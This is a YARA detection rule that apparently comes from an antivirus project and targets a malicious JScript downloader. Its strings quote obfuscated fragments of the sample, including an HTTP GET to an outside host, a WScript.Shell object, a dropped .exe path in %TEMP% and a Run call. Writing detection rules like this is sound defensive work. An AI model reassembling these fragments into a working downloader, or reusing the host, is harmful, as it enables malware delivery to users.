rule sig_20160401_8d39d309f13c99d7312b992af8fb8aa6 {
  meta:
    description = "datamaliciousorder - file 20160401_8d39d309f13c99d7312b992af8fb8aa6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b7eaad0a6bd595a86120d093e27cac092e83f8c49ddcb6f3eeeab017cb75d38d"

  strings:
    $s1  = "BxVe[ZgHy](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var HkCx = function WoPu() {return WScript[HxNse](\"WScript\"+\".Shell\");}(), EuJm = 11;" fullword ascii
    $s3  = "function LiIc(RyoJu, WvCoj){XvGv = XvGv * 1; return RyoJu - WvCoj;};" fullword ascii
    $s4  = "if (BxVe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZjQq() {return HkCx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"aZpLV7eHnZ0mE.ex\" + \"e\";};" fullword ascii
    $s6  = "function BqOzc(){return OhbQj + \"\";};" fullword ascii
    $s7  = "function EtrTl() {return ((PvLtp == true) && (PvLtp == RypNtw)) ? 1 : XvGv;};" fullword ascii
    $s8  = "var XpYq = new this[\"Date\"]();" fullword ascii
    $s9  = "PvLtp = true; " fullword ascii
    $s10 = "var LuPdh = false;" fullword ascii
    $s11 = "RypNtw = true; " fullword ascii
    $s12 = "function WkbRb(){return HxNse;};" fullword ascii
    $s13 = "var RypNtw = false;" fullword ascii
    $s14 = "return LiIc(KovFu, HiiGz);" fullword ascii
    $s15 = "function UzpRy()" fullword ascii
    $s16 = "function YjjXa(){return 23;};" fullword ascii
    $s17 = "function MehHn(MqxJd) {var MiHm = (1, 2, 3, 4, 5, MqxJd); return MiHm;};" fullword ascii
    $s18 = "var PvLtp = false;" fullword ascii
    $s19 = "}while (CnjAsr);" fullword ascii
    $s20 = "function NzxNfh(BsvKz){HkCx[\"R\"+\"un\"](BsvKz, XvGv, XvGv);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}